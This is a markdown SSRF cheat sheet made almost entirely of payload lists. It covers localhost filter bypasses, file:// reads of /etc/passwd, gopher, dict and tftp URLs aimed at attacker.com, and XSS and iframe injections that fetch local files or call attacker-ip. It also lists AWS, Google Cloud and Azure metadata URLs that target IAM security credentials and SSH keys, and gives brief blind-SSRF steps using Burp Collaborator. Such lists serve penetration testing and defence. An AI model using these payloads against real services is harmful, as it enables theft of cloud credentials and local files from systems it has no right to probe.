##### SSRF CHEATSHEET

--------------------------------------------------------------------     
Detection:
Check out parameters such as /file=, /path=, /src= to see if the application can send request only to whitelisted applications

Check out if there is PDF or any other file export tool in place which may be vulnerable to SSRF

--------------------------------------------------------------------
__Basic localhost Payloads:__
http://127.0.0.1:port
http://localhost:port
https://127.0.0.1:port
https://localhost:port
http://[::]:port
http://0000::1:port
http://[0:0:0:0:0:ffff:127.0.0.1]
http://0/
http://127.1
http://127.0.1

--------------------------------------------------------------------
__File path:__
/etc/passwd
file:///etc/passwd
file://path/to/file
file://\/\/etc/passwd

--------------------------------------------------------------------
__With other protocols:__
sftp://attacker.com:port/
dict://attacker:port/
tftp://attacker.com:port/
ldap://localhost:port/
gopher://127.0.0.1:port/

--------------------------------------------------------------------
__From XSS:__
\<img src="xxx" onerror="document.write('\<iframe src=file:///etc/passwd>\</iframe>')"/>\
\<link rel=attachment href="file:///etc/passwd">\

--------------------------------------------------------------------
__With iframe injection:__
<?php $file = $_GET['file']; header("location:file://$file");?>
\<iframe src="http://attacker-ip/test.php?file=/etc/passwd">\</iframe>\

--------------------------------------------------------------------
__AWS:__
http://instance-data
http://169.254.169.254
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/reservation-id
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/public-keys/
http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key
http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy
http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access
http://169.254.169.254/latest/dynamic/instance-identity/document

--------------------------------------------------------------------
__Google Cloud:__
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/
http://metadata/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/id
http://metadata.google.internal/computeMetadata/v1/project/project-id

--------------------------------------------------------------------
Azure:
http://169.254.169.254/metadata/v1/maintenance
http://169.254.169.254/metadata/instance?api-version=2017-04-02
http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text

--------------------------------------------------------------------


##### Blind SSRF vulnerabilities
````
Blind SSRF vulnerabilities arise when an application can be induced to issue a back-end HTTP request to a supplied URL,
but the response from the back-end request is not returned in the application's front-end response.
The most reliable way to detect blind SSRF vulnerabilities is using out-of-band (OAST) techniques.
This involves attempting to trigger an HTTP request to an external system that you control, and monitoring for network interactions with that system.
The easiest and most effective way to use out-of-band techniques is using Burp Collaborator. You can use the Burp Collaborator client.
Simply intercept the requied request and feed it to the intruder then copy the urp collaborator client and paste it inthe referer header
then go to your collaborator client and eatch all the DNS & HTTP requests comming in.
````
Blind SSRF can also be achieved by **SHELLSHOCK VULNERABILITY** 
